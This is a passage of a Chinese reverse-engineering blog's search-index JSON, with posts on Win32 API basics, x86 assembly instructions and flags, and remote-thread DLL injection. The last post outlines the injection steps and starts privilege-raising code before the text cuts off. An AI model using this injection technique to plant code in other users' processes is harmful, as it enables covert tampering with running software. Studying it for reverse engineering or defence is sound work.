{"meta":{"title":"YanChen","subtitle":null,"description":"博客关注WEB网络安全、IT行业、网络资源、电脑技术、网络安全技术、网络安全知识、互联网安全知识、网站建设技术交流博、学习投资、金融理财","author":"John Doe","url":"https://xiaowuyoucy.github.io","root":"/"},"pages":[{"title":"","date":"2019-12-05T12:12:01.571Z","updated":"2019-03-15T13:29:05.675Z","comments":false,"path":"/404.html","permalink":"https://xiaowuyoucy.github.io//404.html","excerpt":"","text":"404 Not Found：该页无法显示-返回博客首页"},{"title":"分类","date":"2019-12-05T12:12:01.590Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"categories/index.html","permalink":"https://xiaowuyoucy.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2019-12-05T12:12:01.613Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"repository/index.html","permalink":"https://xiaowuyoucy.github.io/repository/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-12-05T12:12:01.608Z","updated":"2019-04-14T19:39:56.059Z","comments":true,"path":"links/index.html","permalink":"https://xiaowuyoucy.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-12-05T12:12:01.877Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"tags/index.html","permalink":"https://xiaowuyoucy.github.io/tags/index.html","excerpt":"","text":""},{"title":"关于 陈焱（Yan Chen）","date":"2020-11-17T15:32:01.437Z","updated":"2020-11-17T15:32:01.437Z","comments":false,"path":"about/index.html","permalink":"https://xiaowuyoucy.github.io/about/index.html","excerpt":"","text":"Content [One.陈焱的人生事件纪要] [Two.Resesume of YanChen] Three.Annual Summery of YanChen ​"}],"posts":[{"title":"Win32基础","slug":"Win32基础","date":"2024-01-07T14:28:41.000Z","updated":"2024-01-12T11:43:16.972Z","comments":true,"path":"2024/01/07/Win32基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2024/01/07/Win32基础/","excerpt":"","text":"字符编码 标准的ASCII码 范围是0-127 ASCII码的拓展 范围是128-255 GB2312或GB2312-80 这两个编码是由两张ASCII码的拓展的编码组成 也就是说两个字节表示一个中文 字节1的范围是 128-255 字节2的范围是 128-255 UNICODE编码 UNICODE编码包含全世界所有文字的一个编码表 Unicode编码范围是：0-0x10FFFF，可以容纳100多万个符号! Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。 如何存储UNICODE UTF-16 ​ UTF-16编码以16位无符号整数为单位，注意是16位为一个单位，不表示一个字符就只有16位。这个要看字符的unicode编码处于什么范围而定，有可能是2个字节，也可能是4个字节现在机器上的unicode编码一般指的就是UTF-16 意思是utf-16是以两个字节来划分字符编码的,假如一个字符需要4个字节来表示,UTF-16形式存储会将4字节中的前两个字节编码和后两个字节编码分别存放. UTF-8： 12345Unicode编码(16进制) ║ UTF-8 字节流(二进制) 000000 - 00007F ║ 0xxxxxxx 000080 - 0007FF ║ 110xxxxx 10xxxxxx 000800 - 00FFFF ║ 1110xxxx 10xxxxxx 10xxxxxx 010000 - 10FFFF ║ 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 000000 - 00007F 范围用1个字节存放 000080 - 0007FF 范围用2个字节存放 000800 - 00FFFF 范围用3个字节存放 010000 - 10FFFF 范围用4个字节存放 BOM(Byte Order Mark)： UTF-8 编码存放的文件十六进制开头是EF BB BF UTF-16LE UTF-16小端存放开头是 FF FE UTF-16BE UTF-16大端存放开头 FE FF 123UTF-8 ║ EF BB BF UTF-16LE ║ FF FE UTF-16BE ║ FE FF C语言中的宽字符 123char szStr[] = &quot;中国&quot;;wchar_t swzStr[] = L&quot;中国&quot;; 如果字符串前面不加L,默认是以IDE项目设置的字符集形式，可能是ASCII码 字符串前面加上L，表示用UNICODE字符集存放 wchar_t是宽字符类型，两个字节 打印宽字符 1234567#include &lt;locale.h&gt; //要包含这个头文件setlocale(LC_ALL,&quot;&quot;);//使用控制台默认的编码wchar_t swzStr[] = L“中国”;wprintf(L&quot;%s\\n&quot;,x1); 字符串长度 1234char szStr[] = &quot;中国&quot;; wchar_t swzStr[] = L&quot;中国&quot;; strlen(szStr); //取得多字节字符串中字符长度，不包含 00 wcslen(swzStr); //取得多字节字符串中字符长度，不包含 00 00 常用函数 1234567891011char wchar_t //多字节字符类型 宽字符类型 printf wprintf //打印到控制台函数 strlen wcslen //获取长度 strcpy wcscpy //字符串复制 strcat wcscat //字符串拼接 strcmp wcscmp //字符串比较 strstr wcsstr //字符串查找 Win32 API中的宽字符 什么是Win32 API? 有哪些? 在哪里? 主要是存放在 C:\\WINDOWS\\system32 下面所有的dll 如果是64位系统，system32存放的是64位的DLL，SysWOW64存放的是32位的DLL 几个重要的DLL： &lt;1&gt; Kernel32.dll：最核心的功能模块，比如管理内存、进程和线程相关的函数等。 &lt;2&gt; User32.dll：是Windows用户界面相关应用程序接口,如创建窗口和发送消息等。 &lt;3&gt; GDI32.dll：全称是Graphical Device Interface(图形设备接口),包含用于画图和显示文本的函数。 常用数据类型： 123456789101112131415汇编： byte BYTE PBYTE word WORD PWORD dword DWORD PDWORD C语言： char CHAR PCHAR unsigned char UCHAR PUCHAR short SHORT PSHORT unsigned short USHORT PUSHORT int INT PINT unsigned int UINT PUINT C++语言： bool BOOL 在Win32中使用字符串： 字符类型： 最好使用TCHAR类型,因为TCHAR类型会根据IDE设置的字符集来选择用哪个类型，如果IDE使用的是ASCII字符集,选择的就是CHAR类型，否则选择的是WCHAR类型。 123CHAR szStr[] = “中国”; WCHAR swzStr[] = L“中国”;TCHAR stzSr[] = TEXT(“中国”); TEXT(“中国”)，会自动将字符串转换为当前IDE设置的字符集 字符串指针： PTSTR也是会根据IDE设置的字符集来选择什么类型的字符串指针 123PSTR pszStr = “中国”; PWSTR pwszStr = L“中国”;PTSTR ptszStr = TEXT(“中国”); 第一个Win32 API的使用： 写Win32程序要包含windows.h头文件 123CHAR szTitle[] = &quot;标题&quot;;CHAR szContent[] = &quot;欢迎大家来的Win32 API世界!&quot;;MessageBoxA(0,szContent,szTitle,MB_OK); 123WCHAR swzTitle[] = L&quot;标题&quot;;WCHAR swzContent[] = L&quot;欢迎大家来的Win32 API世界!&quot;;MessageBoxW(0,swzContent,swzTitle,MB_OK); 123TCHAR stzTitle[] = TEXT(&quot;标题&quot;);TCHAR stzContent[] = TEXT(&quot;欢迎大家来的Win32 API世界!&quot;);MessageBox(0,stzContent,stzTitle,MB_OK); MessageBox 会根据平台使用的字符集来选择调用MessageBoxA还是MessageBoxW，其实MessageBoxA内部也是调用MessageBoxW的，只不过会将字符串参数转换为Unicode编码，然后再调用 进程 什么是进程 进程提供程序所需的资源，如：数据、代码等等。 进程内存空间的地址划分 分区 x86 32位Windows 空指针赋值区 0x00000000 - 0x0000FFFF 用户模式区 0x00010000 - 0x7FFEFFFF 64KB禁入区 0x7FFF0000 - 0x7FFFFFFF 内核 0x80000000 - 0xFFFFFFFF 进程的组成部分：模块 在OD中查看进程所包含的模块。 每个模块都是一个可执行文件，遵守相同的格式，即PE结构。 进程的创建： 任何进程都是别的进程创建的：CreateProcess() 进程的创建过程 1、映射EXE文件 2、创建内核对象EPROCESS 3、映射系统DLL(ntdll.dll) 4、创建线程内核对象ETHREAD 5、系统启动线程 映射DLL(ntdll.LdrInitializeThunk) 线程开始执行 创建进程 CreateProcess 123456789101112BOOL CreateProcess( LPCTSTR lpApplicationName, // 应用程序的可执行文件名或路径 LPTSTR lpCommandLine, // 命令行参数 LPSECURITY_ATTRIBUTES lpProcessAttributes, // 进程对象的安全属性 LPSECURITY_ATTRIBUTES lpThreadAttributes, // 主线程对象的安全属性 BOOL bInheritHandles, // 指定新进程是否可以继承当前进程的句柄 DWORD dwCreationFlags, // 控制进程的创建标志 LPVOID lpEnvironment, // 指向新进程的环境块的指针 LPCTSTR lpCurrentDirectory, // 指定新进程的当前工作目录 LPSTARTUPINFO lpStartupInfo, // 指定主窗口的外观及默认的I/O属性 LPPROCESS_INFORMATION lpProcessInformation // 接收新进程和其主线程的信息); 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;windows.h&gt;#include &lt;tchar.h&gt;int _tmain(int argc, _TCHAR* argv[])&#123; // 指定要执行的命令 LPCTSTR command = _T(\"C:\\\\路径\\\\到\\\\你的\\\\可执行文件.exe\"); // 创建进程信息结构 PROCESS_INFORMATION processInfo; ZeroMemory(&amp;processInfo, sizeof(PROCESS_INFORMATION)); // 创建启动信息结构 STARTUPINFO startupInfo; ZeroMemory(&amp;startupInfo, sizeof(STARTUPINFO)); startupInfo.cb = sizeof(STARTUPINFO); // 创建进程 if (CreateProcess( NULL, // 没有模块名（使用命令行） command, // 命令行 NULL, // 进程句柄不可继承 NULL, // 线程句柄不可继承 FALSE, // 不继承句柄 0, // 无特殊标志 NULL, // 使用父进程环境 NULL, // 使用父进程目录 &amp;startupInfo, // 启动信息结构 &amp;processInfo // 进程信息结构 )) &#123; // 等待子进程退出 WaitForSingleObject(processInfo.hProcess, INFINITE); // 关闭进程和线程句柄 CloseHandle(processInfo.hProcess); CloseHandle(processInfo.hThread); &#125; else &#123; _tprintf(_T(\"无法创建进程，错误码：%d\\n\"), GetLastError()); &#125; return 0;&#125; STARTUPINFO 1234567891011121314151617181920typedef struct _STARTUPINFO &#123; DWORD cb; // 结构体的大小，用于指定结构体版本 LPTSTR lpReserved; // 保留，必须为NULL LPTSTR lpDesktop; // 指定新进程的桌面，通常为NULL LPTSTR lpTitle; // 指定新进程的控制台窗口标题，通常为NULL DWORD dwX; // 指定新进程窗口的初始X坐标 DWORD dwY; // 指定新进程窗口的初始Y坐标 DWORD dwXSize; // 指定新进程窗口的初始宽度 DWORD dwYSize; // 指定新进程窗口的初始高度 DWORD dwXCountChars; // 指定新进程窗口的初始宽度（字符单位） DWORD dwYCountChars; // 指定新进程窗口的初始高度（字符单位） DWORD dwFillAttribute; // 控制新进程窗口的文本和背景颜色 DWORD dwFlags; // STARTF_* 标志位，用于指定 STARTUPINFO 结构体的标志 WORD wShowWindow; // 指定新进程窗口的显示状态 WORD cbReserved2; // 保留，必须为0 LPBYTE lpReserved2; // 保留，必须为NULL HANDLE hStdInput; // 指定新进程的标准输入句柄 HANDLE hStdOutput; // 指定新进程的标准输出句柄 HANDLE hStdError; // 指定新进程的标准错误句柄&#125; STARTUPINFO, *LPSTARTUPINFO; PROCESS_INFORMATION typedef struct _PROCESS_INFORMATION { HANDLE hProcess; // 新进程的句柄，用于操作新进程 HANDLE hThread; // 新进程的主线程的句柄，用于操作新进程的主线程 DWORD dwProcessId; // 新进程的进程标识符 DWORD dwThreadId; // 新进程的主线程标识符 } PROCESS_INFORMATION, *LPPROCESS_INFORMATION; GetLastError GetLastError 函数返回一个 DWORD 类型的错误代码，表示最近一次发生的错误。 通常，当一个 Windows API 函数调用失败时，可以使用 GetLastError 函数获取详细的错误信息。错误代码可以通过查阅 Windows API 文档或使用 FormatMessage 函数转换为可读的错误消息。 1DWORD GetLastError(void); ZeroMemory ZeroMemory 不是一个单独的函数，而是一个宏（macro），通常用于将内存区域的内容全部设置为零。以下是 ZeroMemory 宏的定义和简要中文注释： 1#define ZeroMemory(Destination, Length) memset((Destination), 0, (Length)) ZeroMemory 宏使用 memset 函数将目标内存区域的内容全部设置为零。 Destination：指向要清零的内存区域的指针。 Length：要清零的内存区域的字节数。 这个宏的作用等同于使用 memset 函数将内存清零，但它是一种简化的写法。在实际使用中，可以选择使用 memset 函数或 ZeroMemory 宏，两者的效果是相同的。 GetStartupInfo GetStartupInfo 是一个用于获取当前进程的 STARTUPINFO 结构体信息的 Windows API 函数。以下是该函数的原型和简要中文注释： 123void GetStartupInfo( LPSTARTUPINFO lpStartupInfo // 指向 STARTUPINFO 结构体的指针，用于接收当前进程的启动信息); 调试器填写的STARTUPINFO 成员和系统打开进程填写的成员,内容是不一样的 CloseHandle CloseHandle 是一个 Windows API 函数，用于关闭一个打开的内核对象的句柄。以下是该函数的原型和简要中文注释： 123BOOL CloseHandle( HANDLE hObject // 要关闭的内核对象的句柄);","categories":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://xiaowuyoucy.github.io/categories/逆向工程/"}],"tags":[]},{"title":"汇编基础","slug":"汇编基础","date":"2023-12-14T09:58:53.000Z","updated":"2024-01-06T14:19:01.746Z","comments":true,"path":"2023/12/14/汇编基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/12/14/汇编基础/","excerpt":"","text":"位运算 与运算 或运算 异或 非运算 左移 右移 各二进位全部右移若干位，低位丢弃，高位补0或者补符号位 shr是无符号的，高位用0补 sar是有符号的，高位用符号位补 在c语言中&gt;&gt;是包含了shr和sar的,怎么区分有符号和无符号要看类型,比如 unsigned int就是无符号的,右移会使用shr 计算机做加法的过程 4 + 5 = ？ 1、4和5，先异或 4xor5 2、4和5进行与运算，得出来的结果判断是否有进位，如果是0就是没有进位，如果是非0就是有进位。最后左移1位 （4 and 5 ）&lt;&lt; 1 3、将步骤1和步骤2的结果异或 4、将步骤1和步骤2的结果相与，判断还有没有进位，如果有则继续重复上述步骤 123456789101112131415161718192021222324252627282930313233343536373839404142434445 4------ 0000 0100 5------ 0000 0101加--------------------------- 0000 1001 第一步 异或 0000 0100 0000 0101异或--------------------------- 0000 0001 第二步 与，判断是否有进位 0000 0100 0000 0101与--------------------------- 0000 0100第三步，如果第二步与的结果非0表示有进位，需要左移1位0000 0100 &lt;&lt; 1 = 0000 1000第四步 继续异或 0000 0001 0000 1000异或--------------------------- 0000 1001 第五步 将第一步和第三步的结果进行与运算判断是否还有进位 0000 0001 0000 1000与--------------------------- 0000 0000发现是0 表示没有进位,运算结束 4-5=? 4-5 = 4 + (-5) 123456789101112131415161718192021222324254 + (-5)4 0000 0100-5 1111 10111) 异或 0000 0100 1111 1011异或--------------------------- 1111 1111 2) 判断是否有进位 0000 0100 1111 1011与--------------------------- 0000 0000 结果是0,没有进位。1111 1111 就是最终结果 X / Y 表示 X 可以减去多少次Y DTDebug 配置DTDebug UDD path和Plugin path 写自己安装目录下的 通用寄存器 1234567891011121314151617181920MOV 目标操作数，源操作数mov eax,12mov eax,ecxmov ax,12mov ax,cxmov ah,chmov ah,12mov al,clmov al,2mov指令 左右两边的操作数必须是等宽的例如 ax 和 cx是等宽的al 和 cl是等宽的ah 和 cl是等宽的eax 和 ax不是等宽的,因为eax是32位的,ax是16位的 内存 每个进程都有4G的虚拟内存,当某一块虚拟内存需要用到的时候,会将这块虚拟内存映射到物理内存中,最后物理内存会将这块内存映射到内存条中 1234567BYTE 字节 ＝ 8(BIT) WORD 字 = 16(BIT) DWORD 双字 = 32(BIT) 1KB = 1024 BYTE 1MB = 1024 KB 1GB = 1024 MB mov指令使用内存 12345mov 类型 ptr ds:[内存编号],值mov byte ptr ds:[00A90280],22mov word ptr ds:[00A90280],22mov dword ptr ds:[00A90280],22 从指定内存中写入/读取数据 123456789101112131415mov dword ptr ds:[0x0012FF34],0x12345678 mov eax,dword ptr ds:[0x0012FF34] dword ：要读/写多少 此时是4字节 byte == 1字节 word == 2字节 ptr: Point 代表后面是一个指针 (指针的意思就是里面存的不是普通的值，而是个地址) ds：段寄存器 先不用管 记住就行 0x0012FF34:内存编号，必须是32位的 前面0可以省略 注意：地址编号不要随便写，因为内存是有保护的，并不是所有的内存都可以直接读写(需要特别处理) 建议地址编号写成esp的值 寻址公式 1234567LEA 指令作用: 取当前内存的地址编号lea 寄存器,内存地址LEA EAX,DWORD PTR DS:[0X13FFC4] 内存地址的编号存放到EAX中将DS:[0X13FFC4] 内存地址的编号存放到EAX中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788寻址公式一：[立即数] 读取内存的值： MOV EAX,DWORD PTR DS:[0x13FFC4] MOV EAX,DWORD PTR DS:[0x13FFC8] 向内存中写入数据： MOV DWORD PTR DS:[0x13FFC4],eax MOV DWORD PTR DS:[0x13FFC8],ebx 获取内存编号： LEA EAX,DWORD PTR DS:[0X13FFC4] LEA EAX,DWORD PTR DS:[ESP+8] 寻址公式二：[reg] reg代表寄存器 可以是8个通用寄存器中的任意一个 读取内存的值： MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX] 向内存中写入数据： MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX],0x87654321 获取内存编号： LEA EAX,DWORD PTR DS:[EDX] MOV EAX,DWORD PTR DS:[EDX] 寻址公式三：[reg+立即数] 读取内存的值： MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX+4] 向内存中写入数据： MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX+0xC],0x87654321 获取内存编号： LEA EAX,DWORD PTR DS:[EDX+4] MOV EAX,DWORD PTR DS:[EDX+4] 寻址公式四：[reg+reg*&#123;1,2,4,8&#125;] 读取内存的值： MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4] 向内存中写入数据： MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4],87654321 获取内存编号： LEA EAX,DWORD PTR DS:[EAX+ECX*4] 寻址公式五：[reg+reg*&#123;1,2,4,8&#125;+立即数] 读取内存的值： MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4+4] 向内存中写入数据： MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4+4],87654321 获取内存编号： LEA EAX,DWORD PTR DS:[EAX+ECX*4+2] 存储模式 大端模式：数据高位在低位，数据低位在高位 小端模式：数据低位在低位，数据高位在高位 大端0x12345678 小端0x12345678 地址 12 78 0x00000000 34 56 0x00000001 56 34 0x00000002 78 12 0x00000003 DTDEBUG内存窗口的使用 分别以字节/字/双字形式来查看内存（db dw dd） 基本汇编指令 MOV指令 12345678910111213141516171819MOV 的语法： 1、MOV r/m8,r8 r 通用寄存器 2、MOV r/m16,r16 m 代表内存 3、MOV r/m32,r32 imm 代表立即数 4、MOV r8,r/m8 r8 代表8位通用寄存器 5、MOV r16,r/m16 m8 代表8位内存 6、MOV r32,r/m32 imm8 代表8位立即数 7、MOV r8, imm8 8、MOV r16, imm16 9、MOV r32, imm32 ADD指令 123456789101112131415161718192021222324252627ADD AL, imm8 ADD AX, imm16ADD EAX, imm32ADD r/m8, imm8ADD r/m16,imm16ADD r/m32,imm32ADD r/m16, imm8ADD r/m32, imm8ADD r/m8, r8ADD r/m16, r16ADD r/m32, r32ADD r8, r/m8ADD r16, r/m16ADD r32, r/m32 ADC指令：带进位加法 12345678格式：ADC R/M,R/M/IMM 两边不能同时为内存 宽度要一样 ADC AL,CL ADC BYTE PTR DS:[12FFC4],2 ADC BYTE PTR DS:[12FFC4],AL SBB指令：带借位减法 12345678格式：SBB R/M,R/M 两边不能同时为内存 宽度要一样 SBB AL,CL SBB BYTE PTR DS:[12FFC4],2 SBB BYTE PTR DS:[12FFC4],AL SUB指令 减法指令 123456789101112131415161718192021222324252627SUB AL, imm8 SUB AX, imm16SUB EAX, imm32SUB r/m8, imm8SUB r/m16,imm16SUB r/m32,imm32SUB r/m16, imm8SUB r/m32, imm8SUB r/m8, r8SUB r/m16, r16SUB r/m32, r32SUB r8, r/m8SUB r16, r/m16SUB r32, r/m32 XCHG指令：交换数据 12345678格式：XCHG R/M,R/M/IMM 两边不能同时为内存 宽度要一样 XCHG AL,CL XCHG DWORD PTR DS:[12FFC4],EAX XCHG BYTE PTR DS:[12FFC4],AL AND 指令 与指令,两个是1才是1,否则是0 123456789101112131415161718192021222324252627AND AL, imm8AND AX, imm16AND EAX, imm32AND r/m8, imm8AND r/m16,imm16AND r/m32,imm32AND r/m16, imm8AND r/m32, imm8AND r/m8, r8AND r/m16, r16AND r/m32, r32AND r8, r/m8AND r16, r/m16AND r32, r/m32 OR指令 或指令,有一个是1就是1,两个是0就是0 123456789101112131415161718192021222324252627OR AL, imm8OR AX, imm16OR EAX, imm32OR r/m8, imm8OR r/m16,imm16OR r/m32,imm32OR r/m16, imm8OR r/m32, imm8OR r/m8, r8OR r/m16, r16OR r/m32, r32OR r8, r/m8OR r16, r/m16OR r32, r/m32 XOR指令 异或指令, 两个不一样才是1,否则是0 123456789101112131415161718192021222324252627XOR AL, imm8XOR AX, imm16XOR EAX, imm32XOR r/m8, imm8XOR r/m16,imm16XOR r/m32,imm32XOR r/m16, imm8XOR r/m32, imm8XOR r/m8, r8XOR r/m16, r16XOR r/m32, r32XOR r8, r/m8XOR r16, r/m16XOR r32, r/m32 NOT 指令 非指令,0变1,1变0 12345NOT r/m8NOT r/m16NOT r/m32 MOVS指令：移动数据 内存-内存 移动内存[ESI]]的数据到内存[EDI]中 每复制一次,ESI和EDI都会+1（具体加几或减几要看你一次移动多少个字节）或-1，具体是加还是减要看标志寄存器中DF的值，DF是0就+1，D是1就-1 1234567BYTE/WORD/DWORD MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI] 简写为：MOVSB MOVS WORD PTR ES:[EDI],BYTE PTR DS:[ESI] 简写为：MOVSW MOVS DWORD PTR ES:[EDI],BYTE PTR DS:[ESI] 简写为：MOVSD STOS指令： 将Al/AX/EAX的值存储到[EDI]指定的内存单元 12345STOS BYTE PTR ES:[EDI] 简写为STOSB STOS WORD PTR ES:[EDI] 简写为STOSW STOS DWORD PTR ES:[EDI] 简写为STOSD REP指令： 按计数寄存器 (ECX) 中指定的次数重复执行字符串指令 1234567891011MOV ECX,10 REP MOVSD REP STOSD 将内存[esi]中的数据重复ecx次复制到内存[edi]中,每次重复esi和edi都加4REP MOVS DWORD PTR ES:[EDI],DWORD PTR ES:[ESI]将EAX中的值重复ECX次复制到内存[EDI]中,每重复一次,edi都加4REP STOS DWORD PTR ES:[EDI] 堆栈 查看堆栈的大小 ESP寄存器用来存放当前堆栈使用到哪里的地址 PUSH指令: 入栈指令 1234567891、PUSH r322、PUSH r163、PUSH m164、PUSH m325、PUSH imm8/imm16/imm32 POP指令 出栈指令 12345671、POP r322、POP r163、POP m164、POP m32 通过其他指令实现堆栈的存取 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061步骤一：压入数据 MOV EBX,13FFDC BASEMOV EDX,13FFDC TOP 方式一： MOV DWORD PTR DS:[EDX-4],0xAAAAAAAA SUB EDX,4 方式二： SUB EDX,4 MOV DWORD PTR DS:[EDX],0xBBBBBBBB 方式三： MOV DWORD PTR DS:[EDX-4],0xDDDDDDDD LEA EDX,DWORD PTR DS:[EDX-4] 方式四： LEA EDX,DWORD PTR DS:[EDX-4] MOV DWORD PTR DS:[EDX],0xEEEEEEEE 步骤二：读取第N个数 1、方式一：通过Base加偏移来读取 读第一个压入的数据： MOV ESI,DWORD PTR DS:[EBX-4] 读第四个压入的数据： MOV ESI,DWORD PTR DS:[EBX-0x10] 2、方式二：通过Top加偏移来读取 读第二个压入的数据： MOV EDI,DWORD PTR DS:[EDX+4] 读第三个压入的数据： MOV EDI,DWORD PTR DS:[EDX+8] 步骤三：弹出数据 MOV ECX,DWORD PTR DS:[EDX] LEA EDX,DWORD PTR DS:[EDX+4] MOV ESI,DWORD PTR DS:[EDX] ADD EDX,4 LEA EDX,DWORD PTR DS:[EDX+4] MOV EDI,DWORD PTR DS:[EDX-4] 修改EIP寄存器 EIP寄存器存放的是cpu下一条执行的指令 JMP指令：修改EIP的值 123456JMP 寄存器/立即数 类似MOV EIP,寄存器/立即数 jmp eaxjmp 0x11232244 CALL指令： 12345CALL 地址A/寄存器类似PUSH 地址B MOV EIP,地址A/寄存器 RET指令： 12345678910RET [num][num] 可选retret 8类似LEA ESP,[ESP+4] MOV EIP，[ESP-4] 堆栈平衡 进函数前esp和ebp是什么样的,执行函数之后就要还原什么样的 EFLAGS寄存器 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960查看DTDEBUG中的EFLAGS的值，然后转换成二进制的形式，并取出CF/PF/AF/ZF/SF/OF的值 记住这几个寄存器的位置和名称 1、进位标志CF(Carry Flag):如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 MOV AL,0xEF MOV AL,0xFE ADD AL,2 ADD AL,2 2、奇偶标志PF(Parity Flag)：奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。 如果“1”的个数为偶数，则PF的值为1，否则其值为0。 MOV AL,3 ADD AL,3 ADD AL,2 3、辅助进位标志AF(Auxiliary Carry Flag)： 在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0： (1)、在字操作时，发生低字节向高字节进位或借位时； (2)、在字节操作时，发生低4位向高4位进位或借位时。 MOV EAX,0x55EEFFFF MOV AX,5EFE MOV AL,4E ADD EAX,2 ADD AX,2 ADD AL,2 4、零标志ZF(Zero Flag)：零标志ZF用来反映运算结果是否为0。 如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。 XOR EAX,EAX MOV EAX,2 SUB EAX,2 5、符号标志SF(Sign Flag)：符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。 MOV AL,7F ADD AL,2 6、溢出标志OF(Overflow Flag)：溢出标志OF用于反映有符号数加减运算所得结果是否溢出。 如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 最高位进位与溢出的区别： 进位标志表示无符号数运算结果是否超出范围. 溢出标志表示有符号数运算结果是否超出范围. 溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律： 正 + 正 = 正 如果结果是负数，则说明有溢出 负 + 负 = 负 如果结果是正数，则说明有溢出 正 + 负 永远都不会有溢出. 123456789101112131415161718191、无符号、有符号都不溢出 MOV AL,8 ADD AL,8 2、无符号溢出、有符号不溢出 MOV AL,0FF ADD AL,2 3、无符号不溢出、有符号溢出 MOV AL,7F ADD AL,2 4、无符号、有符号都溢出 MOV AL,0FE ADD AL,80 CMP指令： 1234567891011121314151617181920212223 指令格式：CMP R/M,R/M/IMM 该指令是比较两个操作数,实际上,它相当于SUB指令,但是相减的结构并不保存到第一个操作数中。 只是根据相减的结果来改变零标志位的,当两个操作数相等的时候,零标志位置1。 MOV EAX,100 MOV ECX,100 CMP EAX,ECX 观察Z位 MOV EAX,100 MOV ECX,200 CMP EAX,ECX 观察S位 CMP AX,WORD PTR DS:[405000] CMP AL,BYTE PTR DS:[405000] CMP EAX,DWORD PTR DS:[405000] TEST指令： 123456789101112131415161718192021 指令格式：TEST R/M,R/M/IMM 该指令在一定程序上和CMP指令时类似的,两个数值进行与操作,结果不保存,但是会改变相应标志位. 与的操作表项如下： 1 and 1 = 1 1 and 0 = 0 0 and 1 = 0 0 and 0 = 0 常见用法：用这个指令,可以确定某寄存器是否等于0。 TEST EAX,EAX 观察Z位 但是如果EAX的二进制某些位为1的话,那么运算的结果就不为零。 JCC指令 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253541、 JE, JZ 结果为零则跳转(相等时跳转) ZF=1 2、 JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0 3、 JS 结果为负则跳转 SF=1 4、 JNS 结果为非负则跳转 SF=0 5、 JP, JPE 结果中1的个数为偶数则跳转 PF=1 6、 JNP, JPO 结果中1的个数为偶数则跳转 PF=0 7、 JO 结果溢出了则跳转 OF=1 8、 JNO 结果没有溢出则跳转 OF=0 9、 JB, JNAE 小于则跳转 (无符号数) CF=1 10、 JNB, JAE 大于等于则跳转 (无符号数) CF=0 11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1 12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0 13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF 14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF 15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF 16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF 有符号无符号的区别： CMP AL,CL JG 0x12345678 JA 0x12345678","categories":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://xiaowuyoucy.github.io/categories/逆向工程/"}],"tags":[]},{"title":"远程线程注入DLL方法","slug":"远程线程注入DLL方法","date":"2023-12-04T16:43:56.000Z","updated":"2023-12-06T16:05:19.057Z","comments":true,"path":"2023/12/05/远程线程注入DLL方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2023/12/05/远程线程注入DLL方法/","excerpt":"","text":"原理：在目标进程中开启一个线程以执行LoadLibrary(Ex)操作。 步骤： (1) 提升加载进程的权限 (1) 用VirtualAllocEx函数在远程进程的地址空间中分配一块内存存放参数 (2) 用WriteProcessMemory函数把DLL的路径名复制到(1)步骤分配的内存中 (3) 用GetProcAddress获取LoadLibrary(Ex)函数的实际地址 (4) 用CreateRemoteThread函数在远程进程中创建一个线程，让新线程调用正确的LoadLibrary(Ex)函数并在参数中传入(1)步骤分配的内存地址 (5) 用GetProcAddress获取FreeLibrary函数的实际地址 (6) 用CreateRemoteThread函数在远程进程中创建一个线程,让新线程调用正确的FreeLibrary函数并在参数中传入远程DLL的HMODULE (7) 用VirtualFreeEx来释放(1)步骤分配的内存 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116// 远程线程注入DLL#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#define INJECTDLLNAME &quot;HookAPIDLL1.dll&quot;//提升当前进程权限void AdjustProcessTokenPrivilege()&#123; LUID luidTmp; HANDLE hToken; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123; OutputDebugString(&quot;AdjustProcessTokenPrivilege OpenProcessToken Failed ! \\n&quot;); return; &#125; if (!LookupPrivilegeValue(NULL, 